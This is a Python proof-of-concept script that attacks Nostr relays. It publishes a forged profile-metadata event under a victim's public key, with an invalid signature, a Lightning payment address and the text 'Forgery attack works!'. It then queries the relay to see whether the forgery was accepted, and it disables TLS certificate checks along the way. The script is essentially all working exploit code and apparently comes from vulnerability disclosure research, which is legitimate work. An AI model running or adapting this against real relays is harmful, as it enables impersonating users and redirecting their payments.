import sys,os
import random,string,json,base64
sys.path.append(os.path.join(os.path.dirname(__file__), './python-nostr/'))
from nostr.event import Event, EventKind
from nostr.relay_manager import RelayManager
from nostr.key import PublicKey
from nostr.filter import Filter, Filters
from nostr.message_type import ClientMessageType

import time, ssl

relay_manager = RelayManager()
relay_manager.add_relay("wss://relay.example.com")
relay_manager.open_connections({"cert_reqs": ssl.CERT_NONE}) 

published_event_ids = list()

# create invalid event without private key
profile = Event(
  content='{"display_name":"Forged Bob","website":"","name":"Bob","lud06":"choppywave78@walletofsatoshi.com","about":"Forgery attack works!"}',
)
profile.kind = EventKind.SET_METADATA
PUBKEY_VICTIM = 'npub1skynj8ynlun85jm95auypqw7w92saw4mlsyesstac2s2q32cuuss958de4'
profile.public_key = PublicKey.from_npub(PUBKEY_VICTIM).hex()

# add invalid sig
profile.signature = '56cbf291033215020feb533e2898c1634d7a8a2699f06533c73b2bcda6ff86f4c7e0363e5e6d45e68fa54736125c6505c46bcc3943e69a40f110005f6e639da8'

print('update Bob\'s profile to')
print(profile.to_message())

relay_manager.publish_event(profile)

filters = Filters([Filter(authors=[profile.public_key], kinds=[EventKind.SET_METADATA])])
subscription_id = "".join(random.choices(string.ascii_lowercase, k=64))
request = [ClientMessageType.REQUEST, subscription_id]
request.extend(filters.to_json_array())
relay_manager.add_subscription(subscription_id, filters)

message = json.dumps(request)
relay_manager.publish_message(message)
time.sleep(1) # allow the messages to send

while relay_manager.message_pool.has_events():
  event_msg = relay_manager.message_pool.get_event()
  print(event_msg)

relay_manager.close_connections()
